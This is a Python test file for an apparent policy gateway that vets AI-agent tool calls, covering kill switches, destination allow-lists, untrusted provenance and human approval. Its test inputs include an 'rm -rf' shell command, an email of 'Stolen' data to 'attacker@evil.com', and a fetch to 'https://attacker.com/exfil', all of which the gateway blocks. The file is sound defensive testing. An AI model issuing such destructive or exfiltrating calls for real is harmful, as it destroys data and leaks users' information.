"""
Tests for Deterministic Policy Gateway with 100% Rule Coverage.
"""

from datetime import datetime, timedelta, timezone
from typing import Any
from contracts.models import (
    AlignVerdict,
    BuildPolicyRequest,
    CheckActionRequest,
    KillSwitchState,
    Provenance,
    ReasonCode,
    ScopeRule,
    SourceType,
    TaskPolicy,
    Trust,
)
from eva_guard.gateway import (
    PolicyGateway,
    compute_action_hash,
    destination_matches,
)
from eva_guard.approvals import ApprovalsEngine
from eva_guard.align import AlignClient


def make_policy(
    task_id: str = "t-1",
    allowed_ops: list[str] | None = None,
    prohibited_ops: list[str] | None = None,
    allowed_dests: list[str] | None = None,
    approval_for: list[str] | None = None,
    posture: str = "tier2_required",
    expired: bool = False,
) -> TaskPolicy:
    now = datetime.now(timezone.utc)
    delta = timedelta(hours=-1) if expired else timedelta(hours=2)
    return TaskPolicy(
        task_id=task_id,
        user_id="u-1",
        version=1,
        created_at=now,
        expires_at=now + delta,
        allowed_operations=allowed_ops or ["gmail.search", "gmail.read", "gmail.send"],
        allowed_data_scope=[],
        allowed_destinations=allowed_dests or ["alice@corp.com", "https://api.example.com/*"],
        prohibited_side_effects=prohibited_ops or ["files.write"],
        approval_required_for=approval_for or ["gmail.send"],
        minimum_detector_posture=posture,  # type: ignore
        failure_mode="fail_closed",
        max_steps=10,
        origin="template",
    )


def test_rule1_kill_switch_all_write():
    gw = PolicyGateway(kill_switch=KillSwitchState(all_write_tools=True, tools=[], templates=[]))
    policy = make_policy()
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "alice@corp.com", "subject": "Hi", "body": "Hello"},
        read_only=False,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.KILL_SWITCH in resp.reasons


def test_rule1_kill_switch_specific_tool():
    gw = PolicyGateway(kill_switch=KillSwitchState(all_write_tools=False, tools=["gmail.search"], templates=[]))
    policy = make_policy()
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.search",
        args={"query": "test"},
        read_only=True,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.KILL_SWITCH in resp.reasons


def test_rule2_unknown_tool_and_schema():
    gw = PolicyGateway()
    policy = make_policy()

    # Unknown tool
    req_unknown = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="shell.execute",
        args={"command": "rm -rf"},
        read_only=False,
    )
    resp = gw.check(req_unknown, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.TOOL_UNKNOWN in resp.reasons

    # Schema invalid (missing required arg 'query' for gmail.search)
    req_invalid = CheckActionRequest(
        task_id="t-1",
        call_id="c-2",
        tool="gmail.search",
        args={},
        read_only=True,
    )
    resp = gw.check(req_invalid, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.SCHEMA_INVALID in resp.reasons


def test_rule3_policy_expired_or_missing():
    gw = PolicyGateway()
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.search",
        args={"query": "test"},
        read_only=True,
    )

    # Missing policy
    resp_none = gw.check(req, None)
    assert resp_none.decision == "DENY"
    assert ReasonCode.POLICY_EXPIRED in resp_none.reasons

    # Expired policy
    expired_policy = make_policy(expired=True)
    resp_exp = gw.check(req, expired_policy)
    assert resp_exp.decision == "DENY"
    assert ReasonCode.POLICY_EXPIRED in resp_exp.reasons


def test_rule4_tool_prohibited_or_not_in_policy():
    gw = PolicyGateway()
    policy = make_policy(
        allowed_ops=["gmail.search"],
        prohibited_ops=["gmail.send", "files.write"],
    )

    # Prohibited
    req_proh = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "alice@corp.com", "subject": "s", "body": "b"},
        read_only=False,
    )
    resp_proh = gw.check(req_proh, policy)
    assert resp_proh.decision == "DENY"
    assert ReasonCode.TOOL_PROHIBITED in resp_proh.reasons

    # Not in policy
    req_notin = CheckActionRequest(
        task_id="t-1",
        call_id="c-2",
        tool="gmail.read",
        args={"message_id": "123"},
        read_only=True,
    )
    resp_notin = gw.check(req_notin, policy)
    assert resp_notin.decision == "DENY"
    assert ReasonCode.TOOL_NOT_IN_POLICY in resp_notin.reasons


def test_rule5_arg_out_of_scope():
    gw = PolicyGateway()
    policy = make_policy(allowed_ops=["gmail.read"])
    policy.allowed_data_scope = [ScopeRule(tool_prefix="gmail.read", field="message_id", pattern="safe-*")]

    # Out of scope message_id
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.read",
        args={"message_id": "secret-999"},
        read_only=True,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.ARG_OUT_OF_SCOPE in resp.reasons


def test_rule6_destination_not_allowed():
    gw = PolicyGateway()
    policy = make_policy(allowed_dests=["alice@corp.com"])

    # Attempt to send to unlisted destination (attacker)
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "attacker@evil.com", "subject": "Data", "body": "Stolen"},
        read_only=False,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "DENY"
    assert ReasonCode.DESTINATION_NOT_ALLOWED in resp.reasons


def test_rule7_untrusted_arg_provenance():
    gw = PolicyGateway()
    policy = make_policy(allowed_dests=["alice@corp.com", "bob@corp.com"], approval_for=[])

    untrusted_prov = Provenance(
        source_id="msg-1",
        source_type=SourceType.EMAIL,
        trust=Trust.UNTRUSTED,
    )
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "bob@corp.com", "subject": "Hi", "body": "Test"},
        arg_provenance={"to": untrusted_prov},
        read_only=False,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "REQUIRE_APPROVAL"
    assert ReasonCode.UNTRUSTED_ARG_PROVENANCE in resp.reasons


def test_rule8_posture_degraded():
    gw = PolicyGateway()
    policy = make_policy(posture="tier2_required")

    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "alice@corp.com", "subject": "s", "body": "b"},
        read_only=False,
    )
    # Tier 2 is down on side effect
    resp = gw.check(req, policy, tier2_available=False)
    assert resp.decision == "DENY"
    assert ReasonCode.POSTURE_DEGRADED in resp.reasons


def test_rule9_approval_required_and_revalidation():
    gw = PolicyGateway()
    approvals = ApprovalsEngine()
    policy = make_policy(approval_for=["gmail.send"])

    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.send",
        args={"to": "alice@corp.com", "subject": "Report", "body": "Details"},
        read_only=False,
    )

    # Initial check requires approval
    resp = gw.check(req, policy, approvals_engine=approvals)
    assert resp.decision == "REQUIRE_APPROVAL"
    assert ReasonCode.APPROVAL_REQUIRED in resp.reasons
    assert resp.approval is not None

    approval_id = resp.approval.approval_id

    # Human approves
    from contracts.models import SubmitApprovalRequest
    approvals.submit(approval_id, SubmitApprovalRequest(user_id="u-1", approved=True))

    # Recheck with matching hash -> ALLOW
    recheck_req = CheckActionRequest(
        task_id="t-1",
        call_id="c-2",
        tool="gmail.send",
        args={"to": "alice@corp.com", "subject": "Report", "body": "Details"},
        read_only=False,
        approval_id=approval_id,
    )
    recheck_resp = gw.check(recheck_req, policy, approvals_engine=approvals)
    assert recheck_resp.decision == "ALLOW"


def test_rule10_align_advisory_downgrade_only():
    gw = PolicyGateway()
    policy = make_policy(allowed_ops=["web.fetch"], allowed_dests=["https://*"], approval_for=[])

    class MockAlignClient:
        def __init__(self, verdict: str, score: float | None):
            self.verdict = verdict
            self.score = score

        def check(self, req: str, pol: Any, tool: str, args: dict):
            return AlignVerdict(verdict=self.verdict, score=self.score)

    # Misaligned downgrades ALLOW to REQUIRE_APPROVAL
    misaligned_align = MockAlignClient("misaligned", 0.1)
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="web.fetch",
        args={"url": "https://attacker.com/exfil"},
        read_only=True,
    )
    resp = gw.check(
        req,
        policy,
        align_client=misaligned_align,
        original_request="Read my emails",
    )
    assert resp.decision == "REQUIRE_APPROVAL"
    assert ReasonCode.ALIGN_MISALIGNED in resp.reasons


def test_rule11_clean_action_allowed():
    gw = PolicyGateway()
    policy = make_policy()
    req = CheckActionRequest(
        task_id="t-1",
        call_id="c-1",
        tool="gmail.search",
        args={"query": "invoices"},
        read_only=True,
    )
    resp = gw.check(req, policy)
    assert resp.decision == "ALLOW"
    assert resp.reasons == []
